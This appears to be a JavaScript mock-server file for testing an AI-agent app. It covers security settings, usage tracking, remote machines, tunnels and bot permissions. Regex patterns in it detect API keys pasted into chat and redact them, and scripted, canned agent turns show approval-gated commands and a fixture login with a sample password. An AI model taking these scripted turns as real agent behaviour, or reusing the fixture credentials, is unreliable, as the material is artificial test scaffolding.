  // Listed when used, set up (Claude Code), given a plan or with limits that haven't reset yet, like the server does.
  const current = (provider) => settingsLimits(provider).some((l) => l.resets_at != null && l.resets_at > now());
  // Every subscription account (accounts.rs), each with its own limits, under the name the user gave it.
  const subs = new Map(settingsState().subs);
  for (const x of state.providers) if ((x.kind === 'openai_codex' || x.kind === 'claude_code') && !subs.has(x.id)) subs.set(x.id, { label: x.name, plan: null, monthly_usd: null, extra: true });
  const builtIn = (provider) => provider === 'openai-codex' || provider === 'claude-code';
  const listed = ([provider, s]) => s.monthly_usd != null || byModel.size && [...byModel.values()].some((m) => m.provider === provider) || state.providers.some((x) => x.id === provider && (builtIn(provider) || x.authenticated)) || current(provider);
  const subscriptions = [...subs].filter(listed).map(([provider, s0]) => {
    const s = { ...s0, label: state.providers.find((x) => x.id === provider)?.name ?? s0.label };
    const used = [...byModel.values()].filter((m) => m.provider === provider);
    const api = used.filter((m) => m.totals.api_cost_usd != null);
    return {
      provider, label: s.label, ...(s.plan ? { plan: s.plan } : {}),
      ...(s.monthly_usd != null ? { monthly_usd: s.monthly_usd, period_usd: (s.monthly_usd * (to - from)) / (30.44 * DAY) } : {}),
      requests: used.reduce((n, m) => n + m.totals.requests, 0),
      ...(api.length ? { api_cost_usd: api.reduce((n, m) => n + m.totals.api_cost_usd, 0) } : {}),
      limits: settingsLimits(provider),
    };
  });
  return { from, to, total, by_model: [...byModel.values()].sort(byUse), by_kind: [...byKind.values()].sort(byUse), by_day: byDay, unpriced, subscriptions };
}
const settingsNumber = (v, what) => {
  if (typeof v !== 'number' || !Number.isFinite(v) || v < 0 || v > 1e6) throw badRequest(`${what} must be a number of US dollars`);
  return v;
};
/** Known API key formats typed into a chat: [pattern, variable name, what it is]. */
const SETTINGS_KEY_FORMATS = [
  [/\bsk-ant-[A-Za-z0-9_-]{20,}/g, 'ANTHROPIC_API_KEY', 'Anthropic API key'],
  [/\bsk-(?:proj-)?[A-Za-z0-9_-]{20,}/g, 'OPENAI_API_KEY', 'OpenAI API key'],
  [/\b(?:ghp|gho|ghu|ghs)_[A-Za-z0-9]{36}\b|\bgithub_pat_[A-Za-z0-9_]{40,}/g, 'GITHUB_TOKEN', 'GitHub token'],
  [/\bxox[abpors]-[A-Za-z0-9-]{10,}/g, 'SLACK_TOKEN', 'Slack token'],
  [/\bAIza[0-9A-Za-z_-]{35}\b/g, 'GOOGLE_API_KEY', 'Google API key'],
];
/** Stores `value` (the same value keeps its name; one another chat keeps doesn't count) → the variable name.
 * `chat`: keep a new one for that chat alone ("ask" / "chat_only"); `known` collects values stored already. */
function settingsKeep(value, base, description, saved, chat, known) {
  const same = [...state.secrets].find(([, s]) => s.kind === 'token' && s.value === value && (!s.chat || s.chat === chat))?.[0];
  let name = same ?? base;
  for (let n = 2; !same && state.secrets.has(name); n++) name = `${base}_${n}`;
  if (!same) {
    // What it is ("GitHub token", "OpenAI API key 2"), not where it came from (engine/security.rs store_found).
    saveSecret({ name, kind: 'token', description: suggestTitle(name, 'token', [], []), fields: { value } });
    if (chat) state.secrets.get(name).chat = chat;
  }
  if (same && chat) {
    if (!known.includes(`$${name}`)) known.push(`$${name}`);
  } else if (!saved.some((s) => s.name === name)) saved.push({ name, what: description, vars: [`$${name}`] });
  return name;
}
/** engine/security.rs: a card waiting for the user's answer about a secret kept for one chat. */
const SETTINGS_ASK = 'Save to Passwords & keys? ';
const settingsAsk = (s) => ({
  kind: 'notice',
  level: 'info',
  text: `${SETTINGS_ASK}${s.name} (${s.what}) was taken out of your message and is kept for this chat only until you decide; the agent uses it as ${s.vars.join(', ')} without seeing the value.`,
});
/** engine/security.rs `kept_notice`: a card or a one-item "Kept for this chat only" → [name, what, from, vars]. */
function settingsKept(text) {
  if (text.startsWith(SETTINGS_ASK)) {
    const m = /^(\S+) \(([^)]*)\) was taken out of your message[^;]*; the agent uses it as (.+) without seeing the value\.$/.exec(text.slice(SETTINGS_ASK.length));
    return m && [m[1], m[2], 'your message', m[3]];
  }
  if (!text.startsWith('Kept for this chat only: ')) return null;
  const m = /^(\S+) \(([^()]*)\)\. It was taken out of (.+?); the agent uses it as (.+) without seeing the value\.$/.exec(text.slice('Kept for this chat only: '.length));
  return m && [m[1], m[2], m[3], m[4]];
}
/** The notices in `rec` about `name` alone now say what the user chose. */
function settingsSettle(rec, name, choice) {
  const changed = [];
  for (const e of rec?.entries ?? []) {
    const k = e.kind === 'notice' ? settingsKept(e.text) : null;
    if (!k || k[0] !== name) continue;
    const [n, what, from, vars] = k;
    const item = [{ name: n, what, vars: [vars] }];
    const text = choice === 'forget'
      ? `Forgot ${n} (${what}): it was taken out of ${from} and isn't kept anywhere.`
      : settingsNotice(item, from, choice === 'save' ? 'Saved to Passwords & keys: ' : 'Kept for this chat only: ').text;
    if (text === e.text) continue;
    e.text = text;
    changed.push(clone(e));
  }
  if (changed.length) broadcast({ type: 'entries_changed', session_id: rec.info.id, entries: changed });
}
/** engine/security.rs `listed_notice` (saved, or with `prefix` kept for this chat only). */
const settingsNotice = (saved, from, prefix = 'Saved to Passwords & keys: ') => ({
  kind: 'notice',
  level: 'info',
  text: `${prefix}${saved.map((s) => `${s.name} (${s.what})`).join(', ')}. ${saved.length === 1 ? 'It was' : 'They were'} taken out of ${from}; the agent uses ${saved.length === 1 ? 'it' : 'them'} as ${saved.flatMap((s) => s.vars).join(', ')} without seeing the value.`,
});
Object.assign(handlers, {
  get_security: () => settingsSecurity(),
  set_security(p) {
    const s = settingsState().security;
    const next = { ...s };
    if (p.sandbox !== undefined) next.sandbox = oneOf(p.sandbox, ['auto', 'strict', 'off'], 'sandbox mode');
    if (p.folders !== undefined) {
      if (!Array.isArray(p.folders)) throw badRequest('folders must be a list');
      next.folders = [];
      for (const f of p.folders) {
        const path = expandHome(String(f?.path ?? '').trim()).replace(/(.)\/+$/, '$1');
        // The server's wording (engine/security.rs check_folders).
        if (!path.startsWith('/')) throw badRequest(`\`${f?.path}\` is not a full path`);
        if (path === '/') throw badRequest("the whole disk can't be a folder rule; turn off asking before writing elsewhere instead");
        if (SETTINGS_PROTECTED.some((d) => path === d || path.startsWith(d + '/'))) throw badRequest(`\`${f?.path}\` is inside Tessera's own data or settings, which agents never get`);
        if (!next.folders.some((x) => x.path === path)) next.folders.push({ path, write: f?.write === true });
      }
    }
    for (const k of ['ask_outside', 'redact_patterns', 'save_secrets_from_chat']) {
      if (p[k] === undefined) continue;
      if (typeof p[k] !== 'boolean') throw badRequest(`${k} must be true or false`);
      next[k] = p[k];
    }
    if (p.secret_saving !== undefined) next.secret_saving = oneOf(p.secret_saving, ['auto', 'ask', 'chat_only'], 'secret saving');
    if (p.secret_machines != null) next.secret_machines = oneOf(p.secret_machines, ['off', 'picked', 'all'], 'where saved passwords may be used');
    // Only machines the server knows (engine/security.rs).
    if (p.secret_machines_picked != null) next.secret_machines_picked = idList(p.secret_machines_picked).filter((id) => machinesState().some((m) => m.id === id));
    if (p.bot_handoff != null) next.bot_handoff = oneOf(p.bot_handoff, ['on', 'ask', 'off'], 'handing work to bots');
    // One freedom default for all devices: left out until set, then changed but never unset (engine/security.rs).
    if (p.default_permission != null) next.default_permission = permissionOf(p.default_permission);
    settingsState().security = next;
    return settingsSecurity();
  },
  mock_security(p) {
    const k = settingsState().kernel;
    // `windows: true` plays a Windows server: no sandbox, and new chats ask first until a device chooses.
    if (typeof p.windows === 'boolean') {
      k.windows = p.windows;
      Object.assign(k, p.windows
        ? { status: 'unavailable (Tessera has no command sandbox on Windows yet)', complete: false, hint: "Tessera can't sandbox the agent's commands on Windows yet: they run with your account's rights, so they could also read Tessera's own settings and keys. That's why new chats here start with \"Ask me\": each command and change waits for your OK (Settings → Privacy & safety changes it). For the sandbox, run the server on Linux." }
        : { status: 'on (namespaces + Landlock)', complete: true, hint: null });
    }
    if (typeof p.status === 'string') k.status = p.status;
    if (typeof p.complete === 'boolean') k.complete = p.complete;
    if (p.hint !== undefined) k.hint = p.hint;
    return settingsSecurity();
  },
  get_usage: (p) => settingsUsage(p),
  // USAGE (tests): `mock_plan_limits { provider, limits }` sets what a provider last reported (null: nothing).
  mock_plan_limits(p) {
    const provider = String(need(p, 'provider'));
    if (p.limits == null) settingsState().limits.delete(provider);
    else if (!Array.isArray(p.limits)) throw badRequest('limits must be a list');
    else settingsState().limits.set(provider, p.limits.map((l) => ({ ...l })));
    return settingsLimits(provider);
  },
  set_subscription(p) {
    const sub = settingsState().subs.get(String(need(p, 'provider')));
    if (!sub) throw notFound(`No subscription sign-in named ${p.provider}`);
    if (p.monthly_usd != null && (settingsNumber(p.monthly_usd, 'The monthly price') > 100000)) throw badRequest('The monthly price must be at most 100000 US dollars');
    sub.plan = p.plan == null || !String(p.plan).trim() ? null : oneLine(String(p.plan), 80);
    sub.monthly_usd = p.monthly_usd == null ? null : p.monthly_usd;
    return null;
  },
  set_model_price(p) {
    const key = `${need(p, 'provider')}/${need(p, 'model')}`;
    if (p.price == null) settingsState().prices.delete(key);
    else {
      const pr = p.price;
      settingsState().prices.set(key, {
        input: settingsNumber(pr.input, 'The input price'), output: settingsNumber(pr.output, 'The output price'),
        ...(pr.cache_read != null ? { cache_read: settingsNumber(pr.cache_read, 'The cache read price') } : {}),
        ...(pr.cache_write != null ? { cache_write: settingsNumber(pr.cache_write, 'The cache write price') } : {}),
      });
    }
    return null;
  },
  decide_chat_secret(p) {
    const name = String(need(p, 'name'));
    const choice = oneOf(need(p, 'choice'), ['save', 'chat_only', 'forget'], 'choice');
    const s = state.secrets.get(name);
    if (!s) throw notFound(`${name} isn't kept anymore`);
    if (!s.chat) throw badRequest(`${name} is in Passwords & keys already`);
    if (s.chat !== need(p, 'session_id')) throw badRequest(`${name} is kept for another chat`);
    const chat = s.chat;
    if (choice === 'save') delete s.chat;
    if (choice === 'forget') state.secrets.delete(name);
    settingsSettle(state.sessions.get(chat), name, choice);
    return null;
  },
  mock_secret_notice(p) {
    const rec = getRec(p);
    const name = String(p.name ?? 'LIBRARY_LOGIN');
    const fields = { username: 'ann', password: 'correct-horse-battery' };
    saveSecret({ name, kind: 'login', description: 'Library website', fields });
    // Every stored item that holds a value gets the variable instead.
    const swaps = Object.entries(fields).map(([f, v]) => [v, `$${name}_${f.toUpperCase()}`]);
    const changed = [];
    for (const e of rec.entries) {
      const before = JSON.stringify(e);
      let after = before;
      for (const [v, n] of swaps) after = after.split(v).join(n);
      if (after !== before) {
        Object.assign(e, JSON.parse(after));
        changed.push(clone(e));
      }
    }
    if (changed.length) broadcast({ type: 'entries_changed', session_id: rec.info.id, entries: changed });
    return addEntry(rec, settingsNotice([{ name, what: 'login', vars: swaps.map(([, n]) => n).sort() }], 'the conversation'));
  },
});
{
  const send = handlers.send;
  handlers.send = (p, conn) => {
    if (!settingsState().security.save_secrets_from_chat || !Array.isArray(p?.content)) return send(p, conn);
    const saved = [];
    const known = [];
    const mode = settingsState().security.secret_saving ?? 'auto';
    const chat = mode === 'auto' || state.sessions.get(p.session_id)?.info.private ? null : p.session_id;
    const content = p.content.map((c) => {
      if (c?.type !== 'text' || typeof c.text !== 'string' || ATTACHED_RE.test(c.text)) return c;
      let text = c.text;
      for (const [re, base, description] of SETTINGS_KEY_FORMATS) text = text.replace(re, (value) => '$' + settingsKeep(value, base, description, saved, chat, known));
      return text === c.text ? c : { ...c, text };
    });
    const out = send({ ...p, content }, conn);
    const rec = state.sessions.get(p.session_id);
    if (rec && known.length) addEntry(rec, { kind: 'notice', level: 'info', text: `Your message held the stored secret${known.length > 1 ? 's' : ''} ${known.join(', ')}; the agent got the name instead.` });
    if (rec && saved.length) {
      if (!chat) addEntry(rec, settingsNotice(saved, 'your message'));
      else if (mode === 'chat_only') addEntry(rec, settingsNotice(saved, 'your message', 'Kept for this chat only: '));
      else for (const s of saved) addEntry(rec, settingsAsk(s));
    }
    return out;
  };
}
// ─── end of APP-SETTINGS mock handlers ───────────────────────────────────────

// ─── APP-SETUP mock handlers (remote access state for the setup screens) ────
// `mock_tunnel { hostname?, running?, connected?, error?, key_expires_at? }` plays the Cloudflare tunnel's live
// state (tests): with a hostname and no tunnel yet it adds one as `cloudflare_setup` would (URL + the two Access
// headers, the key good for a year); `error: null` clears the error; `key_expires_at` sets when the devices' key
// runs out (unix seconds; null: unknown, as for tunnels set up before the server kept it); `{ remove: true }`
// drops it again. Adding or removing broadcasts `server_route_changed`. Returns RemoteStatus.
handlers.mock_tunnel = (p = {}) => {
  const r = state.remote;
  if (p.remove) {
    if (r.tunnel) r.urls = r.urls.filter((u) => u !== `https://${r.tunnel.hostname}`);
    r.headers = r.headers.filter(([k]) => k !== 'CF-Access-Client-Id' && k !== 'CF-Access-Client-Secret');
    r.tunnel = null;
    broadcast({ type: 'server_route_changed' });
    return remoteStatus();
  }
  if (!r.tunnel) {
    const hostname = String(p.hostname ?? 'tessera.example.com');
    const url = `https://${hostname}`;
    if (!r.urls.includes(url)) r.urls.push(url);
    const headers = new Map(r.headers);
    headers.set('CF-Access-Client-Id', `${hex(16)}.access`);
    headers.set('CF-Access-Client-Secret', hex(32));
    r.headers = [...headers];
    r.tunnel = { hostname, tunnel_id: crypto.randomUUID(), key_expires_at: Math.floor(now() / 1000) + KEY_LIFETIME };
    broadcast({ type: 'server_route_changed' });
  }
  for (const k of ['running', 'connected']) if (typeof p[k] === 'boolean') r.tunnel[k] = p[k];
  if ('error' in p) r.tunnel.error = p.error ? String(p.error) : null;
  if ('key_expires_at' in p) r.tunnel.key_expires_at = p.key_expires_at == null ? null : Number(p.key_expires_at);
  return remoteStatus();
};
// ─── end of APP-SETUP mock handlers ──────────────────────────────────────────

// ─── MACHINES mock handlers (contract 6 §1, contract 8: presets, who can use it, Devices) ───
// `list_machines` → MachineInfo[] { id, name, os, version, online, last_seen, paused, scope: { folders, commands,
// ask, timeout_secs, desktop?, bots? }, sandbox, sandbox_ok, running, preset, home, recent }. `set_machine_paused
// { id, paused }` → MachineInfo; `revoke_machine { id }` → null (the machine drops off). Both broadcast
// `machines_changed`. Nothing here can turn a machine on or widen it: only the machine itself can (its terminal or
// its desktop app's local commands). Machines are paired devices: Desktop and the MacBook are in `list_devices` too
// (with `online`); nas runs only as a machine (no device entry).
// `mock_machines { list?: MachineInfo[] | [], online?: { id, online }, join?: { name, preset?, os? } }` replaces
// the list, flips one, or has a new computer join (as `tessera node enable '<link>'` would; tests).
// Chats: "build it on Desktop" (on a machine's name) or "check my machines" runs the `machines` tool:
// `run` (asks first, unless the chat is YOLO) and `list`.
function machinesState() {
  if (!state.machines) {
    const t = now();
    state.machines = [
      {
        id: 'dev_desktop', name: 'Desktop', os: 'linux x86_64', online: true, last_seen: t, paused: false, version: '0.1.0',
        sandbox: 'on (namespaces + Landlock)', sandbox_ok: true, running: 0, preset: 'work_in_folders', home: HOME,
        scope: { folders: [{ path: `${HOME}/proj`, write: true }], commands: true, ask: 'always', timeout_secs: 300, webviews: true },
        recent: [
          { ts: t - 2 * MIN, action: 'run', target: 'cargo build --release', chat: 'Build the site', outcome: 'done' },
          { ts: t - 9 * MIN, action: 'read', target: `${HOME}/proj/README.md`, chat: 'Build the site', outcome: 'done' },
          { ts: t - 40 * MIN, action: 'write', target: `${HOME}/.bashrc`, chat: 'Tidy up', outcome: 'refused' },
        ],
      },
      {
        id: 'dev_nas', name: 'nas', os: 'linux aarch64', online: false, last_seen: t - 2 * 3600_000, paused: false, version: '0.1.0',
        sandbox: 'partial (namespaces only)', sandbox_ok: false, running: 0, preset: 'custom', home: '/home/admin',
        scope: { folders: [{ path: '/srv/media', write: false }], commands: true, ask: 'risky', timeout_secs: 60, bots: [FORGE] },
        recent: [{ ts: t - 3 * 3600_000, action: 'list', target: '/srv/media', chat: 'Homelab sweep · 03:00', bot: 'Forge', outcome: 'done' }],
      },
      {
        id: 'dev_mbp', name: 'MacBook', os: 'macos aarch64', online: true, last_seen: t, paused: true, version: '0.1.0',
        sandbox: 'off (no sandbox on macOS yet)', sandbox_ok: false, running: 0, preset: 'look_only', home: '/Users/me',
        scope: { folders: [], commands: false, ask: 'chat', timeout_secs: 900 }, recent: [],
      },
    ];
    // Desktop and the MacBook are paired devices too (as machines always are on a real server).
    for (const m of state.machines.filter((x) => x.id !== 'dev_nas'))
      if (!state.devices.some((d) => d.id === m.id)) state.devices.push({ id: m.id, name: m.name, created_at: t - 30 * DAY, last_seen: m.last_seen, current: false });
  }
  return state.machines;
}
/** A device is online while it has a connection here, or (for the mock's machines) while its machine is. */
function deviceOnline(id) {
  return [...clients].some((c) => c.deviceId === id) || !!(state.machines ?? []).find((m) => m.id === id)?.online;
}
const machineCopy = (m) => ({ ...m, recent: (m.recent ?? []).map((a) => ({ ...a })), scope: { ...m.scope, folders: m.scope.folders.map((f) => ({ ...f })), ...(m.scope.bots ? { bots: [...m.scope.bots] } : {}) } });
function machineById(id) {
  const m = machinesState().find((x) => x.id === id);
  if (!m) throw notFound(`no machine \`${id}\``);
  return m;
}
Object.assign(handlers, {
  list_machines: () => machinesState().map(machineCopy),
  set_machine_paused(p = {}) {
    const m = machineById(String(p.id ?? ''));
    if (typeof p.paused !== 'boolean') throw badRequest('missing field `paused`');
    m.paused = p.paused; // resuming never widens: the scope is the machine's own
    broadcast({ type: 'machines_changed' });
    return machineCopy(m);
  },
  revoke_machine(p = {}) {
    const m = machineById(String(p.id ?? ''));
    state.machines = machinesState().filter((x) => x !== m);
    // Saved passwords allowed there aren't any more (auth.rs forget, engine/security.rs forget_secret_machine).
    if (m) {
      for (const sec of state.secrets.values()) if (sec.on_machines?.includes(m.id)) sec.on_machines = sec.on_machines.filter((x) => x !== m.id);
      const sx = settingsState().security;
      sx.secret_machines_picked = sx.secret_machines_picked.filter((x) => x !== m.id);
    }
    broadcast({ type: 'machines_changed' });
    return null;
  },
  mock_machines(p = {}) {
    if (Array.isArray(p.list)) state.machines = p.list.map(machineCopy);
    if (p.online) machineById(p.online.id).online = !!p.online.online;
    if (p.join) {
      const t = now();
      const id = `dev_${hex(6)}`;
      state.devices.push({ id, name: p.join.name, created_at: t, last_seen: t, current: false, kind: 'machine' });
      machinesState().push({
        id, name: p.join.name, os: p.join.os ?? 'linux x86_64', online: true, last_seen: t, paused: false, version: '0.1.0',
        sandbox: p.join.sandbox ?? (p.join.os?.startsWith('windows') ? 'off (no sandbox on Windows yet)' : 'on (namespaces + Landlock)'),
        sandbox_ok: p.join.sandbox_ok ?? !p.join.os?.startsWith('windows'), running: 0, preset: p.join.preset ?? 'look_only', home: p.join.home ?? '/home/me',
        scope: { folders: [], commands: false, ask: 'risky', timeout_secs: 300 }, recent: [],
      });
    }
    broadcast({ type: 'machines_changed' });
    return machinesState().map(machineCopy);
  },
});
const MACHINE_BUILD_OUTPUT = '   Compiling tessera-core v0.1.0 (/home/user/proj/crates/core)\n   Compiling tessera v0.1.0 (/home/user/proj/crates/cli)\n    Finished `dev` profile [unoptimized + debuginfo] target(s) in 6.42s';
async function scenarioMachines(t, text) {
  const target = machinesState().find((m) => new RegExp(`\\b${m.name}\\b`, 'i').test(text) && !m.paused && m.online);
  if (!target) {
    await t.step({
      thinking: 'They asked about their machines. List them with what each allows before doing anything.',
      text: 'Let me check which of your machines are available.',
      calls: [{ name: 'machines', args: { action: 'list' }, exec: { duration: 300, text: machinesState().map((m) => `${m.name}: ${m.paused ? 'paused' : m.online ? 'online' : 'offline'}`).join('\n') } }],
    });
    await t.step({ text: 'Desktop is online and can build in ~/proj. The MacBook is paused and nas is offline. Say the word and I\'ll run the build on Desktop.' });
    return;
  }
  const args = { machine: target.name, machine_id: target.id, action: 'run', command: 'cargo build', cwd: '~/proj' };
  const [r] = await t.step({
    thinking: `The build should run on ${target.name}, where the project lives. ${target.name} asks before every action, so this waits for approval.`,
    text: `I'll run the build on ${target.name}.`,
    calls: [{
      name: 'machines', args,
      approval: { summary: `on ${target.name}: cargo build`, reason: `Runs a command on ${target.name} in ~/proj. ${target.name} asks before every action.`, once: true },
      exec: { chunks: toChunks(MACHINE_BUILD_OUTPUT), duration: 600, details: { exit_code: 0, machine: target.id }, text: MACHINE_BUILD_OUTPUT },
    }],
  });
  await t.step({ text: r.denied ? `Understood, nothing ran on ${target.name}.` : `The build on ${target.name} finished cleanly in about 6 seconds.` });
}
SCENARIOS.unshift([/\bon (desktop|macbook|nas)\b|\bmy machines\b/i, scenarioMachines]);
/**
 * "… as administrator on Desktop" / "… with sudo on Desktop" (batch 17, MachineScope.admin): where the machine allows
 * administrator commands, the agent just runs it (`run` with `admin: true`) and the approval card is the user's say
 * (tools/machines.rs: "as administrator (root, with sudo) … asks before every administrator command", even in YOLO
 * with `admin: "ask"`); where it doesn't, the tool refuses before asking and the agent says how to allow it or which
 * command to run, never "may I?" in prose.
 */
async function scenarioMachineAdmin(t, text) {
  const target = machinesState().find((m) => new RegExp(`\\b${m.name}\\b`, 'i').test(text) && !m.paused && m.online);
  if (!target) return scenarioMachines(t, text);
  const command = 'sudo systemctl restart bluetooth';
  const args = { machine: target.name, machine_id: target.id, action: 'run', command, cwd: '~', admin: true };
  const admin = target.scope?.admin ?? 'off';
  if (admin === 'off' || !target.scope?.commands) {
    const why = `Administrator commands are off on ${target.name}. Only the user can turn them on, on that computer (Settings → Devices → This computer → Administrator, or \`tessera node admin on\`). Otherwise give the user the exact command to run there.`;
    await t.step({
      thinking: `Restarting Bluetooth needs root on ${target.name}. Run it as administrator.`,
      text: `Restarting Bluetooth on ${target.name} as administrator.`,
      calls: [{ name: 'machines', args, exec: { duration: 200, is_error: true, text: why } }],
    });
    await t.step({ text: `Administrator commands are off on ${target.name}, so I can't do this one from here. Either turn on **Administrator** on ${target.name} (Settings → Devices → This computer, on that computer) and ask again, or run this there yourself:\n\n\`\`\`\n${command}\n\`\`\`` });
    return;
  }
  const [r] = await t.step({
    thinking: `The user asked for it and ${target.name} allows administrator commands: run it; the approval card is where they say yes.`,
    text: `Restarting Bluetooth on ${target.name} as administrator.`,
    calls: [{
      name: 'machines', args,
      ...(admin === 'ask' || target.scope.ask === 'always'
        ? { approval: { summary: `on ${target.name}: ${command}`, reason: `Runs a command as administrator (root, with sudo) on ${target.name} in ~, outside its sandbox. ${target.name} asks before every administrator command.`, once: true } }
        : {}),
      exec: { duration: 400, details: { exit_code: 0, machine: target.id }, text: '(no output) [exit 0 · 0.4s]' },
    }],
  });
  await t.step({ text: r.denied ? `Understood, nothing ran on ${target.name}.` : `Bluetooth on ${target.name} restarted.` });
}
SCENARIOS.unshift([/\b(as (administrator|root)|with sudo)\b.*\bon (desktop|macbook|nas)\b|\bon (desktop|macbook|nas)\b.*\b(as (administrator|root)|with sudo)\b/i, scenarioMachineAdmin]);
// ─── end of MACHINES mock handlers ───────────────────────────────────────────

// ─── BOT-SECRETS mock handlers (batch 16) ────────────────────────────────────
// `Bot.secrets { default, each: { [password name]: boolean } }`: which saved passwords open to any chat (bots: null)
// a bot may use (engine auth.rs `joins_open`); ones kept for certain bots follow their own list. `save_bot` keeps the
// stored one when an edit leaves it out; a new bot saved without it gets none ({ default: false, each: {} }); entries
// equal to the default are dropped; bots without the field (made before it) use all of them. Renaming a password
// moves bots' entries to the new name; deleting it drops them (each broadcasts `bot_updated`).
{
  const settle = (v) => {
    const def = v.default === true;
    const each = Object.fromEntries(Object.entries(v.each ?? {}).filter(([k, on]) => k && k.length <= 128 && typeof on === 'boolean' && on !== def).slice(0, 512));
    return { default: def, each };
  };
  const saveBot = handlers.save_bot;
  handlers.save_bot = (p, conn) => {
    const b = p?.bot ?? {};
    const before = b.id ? botById(String(b.id)) : null;
    const kept = before?.secrets;
    const sent = b.secrets && typeof b.secrets === 'object' && !Array.isArray(b.secrets) ? settle(b.secrets) : undefined;
    const bot = saveBot(p, conn);
    const secrets = sent ?? (before ? kept : { default: false, each: {} });
    if (secrets) bot.secrets = secrets;
    else delete bot.secrets;
    broadcast({ type: 'bot_updated', bot });
    return bot;
  };
  const follow = (from, to) => {
    for (const bot of state.bots) {
      if (!bot.secrets || !(from in bot.secrets.each)) continue;
      const on = bot.secrets.each[from];
      delete bot.secrets.each[from];
      if (to) bot.secrets.each[to] = on;
      broadcast({ type: 'bot_updated', bot });
    }
  };
  const saveSecretH = handlers.save_secret;
  handlers.save_secret = (p, conn) => {
    const out = saveSecretH(p, conn);
    if (out?.name && out.name !== String(p.name).trim()) follow(String(p.name).trim(), out.name);
    return out;
  };
  const deleteSecretH = handlers.delete_secret;
  handlers.delete_secret = (p, conn) => {
    const out = deleteSecretH(p, conn);
    follow(String(p.name), null);
    return out;
  };
}
// ─── end of BOT-SECRETS mock handlers ────────────────────────────────────────

// ─── BOT-MACHINES and AUTHORS mock handlers (batch 11) ───────────────────────
// `Bot.machines { default, each: { [machine id]: 'no_access' | 'read_only' | 'allowed' } }`: what a bot may do on
// each machine, never more than the machine allows (engine/machines.rs). `save_bot` keeps the stored one when an
// edit leaves it out; a new bot saved without it gets none ({ default: 'no_access', each: {} }); bots without the
// field (made before the setting) use each machine as it allows. In a bot's chat "build it on Desktop" is refused
// when the bot has no access there, or may only read.
// Authors of "user" entries that aren't the user's (engine.rs): a plain chat's agent asking a bot writes as
// `chat:<session id>`, a subagent's task as its bot or `chat:<parent id>`, a job run's instructions as `job:<id>`.
// `mock_session { title?, kind?, bot_id?, members?, entries: [{ kind: 'user' | 'assistant', text, author? }] }`
// → SessionInfo: a session holding these entries as a server stored them (tests: an older server's bot DM).
const MACHINE_ACCESS = ['no_access', 'read_only', 'allowed'];
/** What a bot may do on machine `id` before the machine's own say. */
function botMachineAccess(bot, id) {
  const m = bot?.machines;
  if (!m) return 'allowed';
  return m.each?.[id] ?? m.default ?? 'no_access';
}
{
  const accessOf = (v) => (MACHINE_ACCESS.includes(v) ? v : 'no_access');
  const saveBot = handlers.save_bot;
  handlers.save_bot = (p, conn) => {
    const b = p?.bot ?? {};
    const before = b.id ? botById(String(b.id)) : null;
    const kept = before?.machines;
    const sent = b.machines && typeof b.machines === 'object' && !Array.isArray(b.machines)
      ? {
        default: accessOf(b.machines.default),
        each: Object.fromEntries(Object.entries(b.machines.each ?? {}).filter(([k]) => k && k.length <= 128).slice(0, 64).map(([k, v]) => [k, accessOf(v)])),
      }
      : undefined;
    const bot = saveBot(p, conn);
    const machines = sent ?? (before ? kept : { default: 'no_access', each: {} });
    if (machines) bot.machines = machines;
    else delete bot.machines;
    broadcast({ type: 'bot_updated', bot });
    return bot;
  };
  const i = SCENARIOS.findIndex(([, fn]) => fn === scenarioMachines);
  SCENARIOS[i][1] = async (t, text, rec) => {
    const bot = sessionBot(rec);
    const target = machinesState().find((m) => new RegExp(`\\b${m.name}\\b`, 'i').test(text) && !m.paused && m.online);
    const level = bot && target ? botMachineAccess(bot, target.id) : 'allowed';
    if (level === 'allowed') return scenarioMachines(t, text, rec);
    const why = level === 'no_access'
      ? `${target.name}: @${bot.handle} has no access to it. The user can give it access in the bot's settings (Machines); continue without it.`
      : `${target.name}: this bot may only read files and list folders there; commands and changes need more access, which the user can give in the bot's settings (Machines).`;
    await t.step({
      thinking: `The build belongs on ${target.name}.`,
      text: `I'll run the build on ${target.name}.`,
      calls: [{ name: 'machines', args: { machine: target.name, action: 'run', command: 'cargo build', cwd: '~/proj' }, exec: { duration: 200, is_error: true, text: why } }],
    });
    await t.step({
      text: level === 'no_access'
        ? `I can't use ${target.name}: I have no access to it. You can give me access in my settings, under Machines.`
        : `I may only read files on ${target.name}, so I can't run the build there. You can give me more access in my settings, under Machines.`,
    });
  };
  handlers.mock_session = (p = {}) => {
    const rec = createSession({ kind: p.kind ?? 'chat', title: String(p.title ?? ''), bot_id: p.bot_id, members: p.members ?? [] });
    for (const e of p.entries ?? []) {
      const content = e.kind === 'assistant' ? [{ type: 'text', text: String(e.text ?? '') }] : [{ type: 'text', text: String(e.text ?? '') }];
      addEntry(rec, e.kind === 'assistant'
        ? { kind: 'assistant', content, model: { ...rec.info.model }, usage: zeroUsage(), stop: 'stop', ...(e.author ? { author: e.author } : {}) }
        : { kind: 'user', content, ...(e.author ? { author: e.author } : {}) });
    }
    rec.info.preview = computePreview(rec.entries);
    emitSession(rec);
    return rec.info;
  };
}

// ─── NODE-WV mock handlers (contract 8: web views on a machine) ───────────────
// A web view (`url` board) runs on the machine of the device that made it, when that device is a machine with
// "Web views here" (`scope.webviews`) that is online and not paused: the board gets `host` (the machine's id).
// `browser_to_server { board_id }` → Whiteboard: the board moves to the server (no `host`, version + 1).
// Attaching to a board whose machine can't show it fails with the reason. `mock_machines { me: { name,
// webviews?, online? } }` turns the calling device into a machine (tests); `mock_web_host { board_id, host }`
// sets a board's host directly. `browser_show_on_screen { board_id, show? = true }` → null (engine
// `Browsers::show_on_screen`): a web view on the server can't ("…has no screen to show it on…"); one on a
// machine that can't show it fails with machineDown's reason; otherwise the board is "on screen" (its frames
// stop) until `show: false` (or `mock_screen_closed { board_id }`, the user closing the window there).
function webMachine(id) {
  const m = id && machinesState().find((x) => x.id === id);
  return m && m.online && !m.paused && m.scope.webviews ? m : null;
}
function machineDown(id) {
  const m = machinesState().find((x) => x.id === id);
  if (!m) return 'that machine isn\'t known here any more';
  if (!m.online) return `${m.name} is offline`;
  if (m.paused) return `${m.name} is paused; it can be resumed in Settings → Devices`;
  if (!m.scope.webviews) return `web views are off on ${m.name}; only that computer can turn them on`;
  return null;
}
{
  const createBoard = handlers.create_board;
  const attach = handlers.browser_attach;
  const mockMachines = handlers.mock_machines;
  Object.assign(handlers, {
    create_board(p, conn) {
      const b = createBoard(p, conn);
      const m = b.content?.type === 'url' && b.version === 1 && !b.host ? webMachine(conn?.deviceId) : null;
      if (!m) return b;
      const placed = { ...b, host: m.id };
      state.boards.set(b.id, placed);
      broadcast({ type: 'board_updated', board: placed });
      return placed;
    },
    browser_to_server(p) {
